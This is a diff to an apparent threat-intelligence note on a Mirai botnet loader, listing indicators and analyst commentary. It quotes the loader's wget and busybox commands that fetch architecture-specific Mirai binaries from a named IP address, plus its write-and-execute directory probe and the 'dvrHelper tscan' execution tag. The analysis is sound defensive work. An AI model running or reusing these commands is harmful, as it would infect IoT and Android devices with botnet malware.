@@ -37,11 +37,31 @@
 # [CAMPAIGN METADATA]
 # Family      : MIRAI_LOADER (unobfuscated Mirai loader)
 # Config      : SERVER="77.90.185.66"
+# Architectures: ARCHS="arm arm5 arm7 mips mpsl"   (5)
 # Retrieval   : wget "http://$SERVER/mirai.$arch" -O-
 #               || busybox wget "http://$SERVER/mirai.$arch" -O-
 # Output file : dvrHelper       <- the classic Mirai binary name
+# Exec tag    : ./dvrHelper tscan    <- added 2026-08-08. This family's
+#               equivalent of MIRAI_TELNETCURL's "telnet.curl". "dvrHelper"
+#               alone is a shared Mirai artefact name and a poor
+#               discriminator; "dvrHelper tscan" is this loader specifically.
 # Also drops  : "$dir"/.f  with chmod 777, executed then cd "$dir"
 # Permissions : chmod +x dvrHelper || chmod 777 dvrHelper
+# No shebang  : the file begins directly with the DIRS= assignment.
+
+# [TARGET DIRECTORIES — note the Android path]
+# DIRS="/tmp /var /dev /var/tmp /dev/shm /data/local/tmp"
+#
+# /data/local/tmp is ANDROID, not conventional Linux. Added 2026-08-08 —
+# this loader targets Android devices (and Android-derived embedded systems
+# such as set-top boxes and IP cameras) as well as Linux. Scoping an
+# investigation to Linux hosts alone will miss part of the affected estate.
+#
+# The loop is a write-and-execute probe, not just a chdir:
+#   echo > "$dir"/.f && chmod 777 "$dir"/.f && "$dir"/.f && cd "$dir"
+# It creates .f, makes it executable, RUNS it, and only then settles in that
+# directory — so it selects the first location that permits both write and
+# exec. Presence of an empty world-writable .f is a host indicator.
 # VirusTotal  : no VT record at capture time (sidecar scan is null —
 #               absence of data, NOT a clean verdict)
 
